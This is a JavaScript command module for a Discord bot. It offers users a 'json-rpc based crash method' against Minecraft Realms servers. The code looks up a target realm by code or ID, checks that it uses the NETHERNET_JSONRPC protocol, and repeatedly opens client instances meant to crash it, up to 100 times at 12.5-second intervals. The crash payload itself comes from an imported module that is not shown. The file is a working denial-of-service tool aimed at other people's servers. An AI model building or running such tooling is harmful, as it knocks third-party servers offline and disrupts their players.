const realmAPI = require("../../classes/Realm.js");
const createInstance = require("../../functions/client.js")

let currentlyCrashing = new Map()

module.exports = {
    subCommand: "json",
    data: {
        name: 'rpc',
        description: 'A json-rpc based crash method.',

        options: [
            {
                name: 'realm',
                description: 'The realm to connect to',
                type: 3,
                required: true,
                min_length: 6,
                max_length: 17
            },
            {
                name: "loop",
                description: "Amount of times to loop the crash method.",
                type: 4,
                min_value: 1,
                max_value: 100,
                required: false
            }
        ]
    },
    global: true,
    linkOnly: true,
    /**
     * @param {import("discord.js").CommandInteraction} interaction
     * @param {{ component: import("../../classes/Component.js"), dbUser: import("../../functions/Database.js").User }} param1
     */
    async execute(interaction, { component, flags, dbUser }) {
        const input = interaction.options.getString('realm');
        const loop = interaction.options.getInteger('loop') || 1;

        if (currentlyCrashing.has(interaction.user.id)) {
            component
                .text(`### Something went wrong. (Crash C1)\n`, true)
                .separator()
                .text(`\`   You are already crashing a realm!   \``)

            return interaction.reply({ components: [component], flags });
        }

        component.text(
            `### ${interaction.options?._subcommand || interaction.commandName}\n` +
            `Please wait while crashing tests your input, this is usually a fast process.\n` +
            `### -# Input: \`${input}\``,
            true
        ).separator();

        await interaction.reply({ components: [component], flags });

        try {
            const RealmAPI = new realmAPI(dbUser);
            await RealmAPI.init();

            let realm = /^\d+$/.test(input)
                ? await RealmAPI.getRealmInfoByID(input)
                : await RealmAPI.getRealmInfo(input, false);

            let check = await RealmAPI.doRealmChecks(realm, null);
            if (check?.errorMsg) {
                component.text(`### Something went wrong. (RealmAPI C1)\n`, true)
                    .separator()
                    .text(`\`   ${check.errorMsg}   \``)

                return interaction.editReply({ components: [component], flags });
            }

            delete realm.players // fuck me this uses storage on large member based realms :sob:

            currentlyCrashing.set(interaction.user.id, true)
            component.text(
                `### ${interaction.options?._subcommand || interaction.commandName}\n` +
                `crashing has found ***${realm.name}*** (${realm.id}) and has started to attempt to loop it, once your set loop count has finished you will be informed VIA a DM from the bot.\n` +
                `### -# Input: \`${input}\`\n` +
                `### -# Loop Count: \`${loop}\`\n` +
                `### -# Estimated Time: <t:${Math.floor(Date.now() / 1000) + (loop * 12.5)}:R>\n` +
                `# -# This crash is a hit and noHit, it could work but may take time.`,
                true
            ).separator();
            await interaction.editReply({ components: [component], flags });

            for (let i = 0; i < loop; i++) { // 15 loops = 1 minute and 52.5 seconds (15 * 12.5 seconds = 187.5 seconds)
                const host = await RealmAPI.getRealmIP(realm.id);
                check = await RealmAPI.doRealmChecks(null, host);
                if (check?.errorMsg) {
                    component.text(`### Something went wrong. (RealmAPI C2)\n`, true)
                        .separator()
                        .text(`\`   ${check.errorMsg}   \``)

                    return interaction.user.send({ components: [component], flags }).catch(() => { });
                }

                if (host.body?.networkProtocol !== "NETHERNET_JSONRPC") {
                    component.text(`### Something went wrong. (RealmAPI C3)\n`, true)
                        .separator()
                        .text(`\`   ${host.body?.networkProtocol} is not a supported protocol for this method!   \``)

                    return interaction.user.send({ components: [component], flags }).catch(() => { });
                }

                await createInstance(realm, dbUser, {
                    protocol: host.body?.networkProtocol,
                    address: host.body?.address,
                    external: { enabled: true, type: 3 }
                }, RealmAPI.api)

                await new Promise(resolve => setTimeout(resolve, 12500)) // wait 12.5 seconds between each crash
            }
        } catch (error) {
            console.error(error);
        } finally {
            currentlyCrashing.delete(interaction.user.id)

            component.text(`### Success!\n`, true)
                .separator()
                .text(`crashing has finished your requested loops ***\`[${loop}]\`*** on ***${realm.name}*** (${realm.id}).`)

            return interaction.user.send({ components: [component], flags }).catch(() => { });
        }
    }
}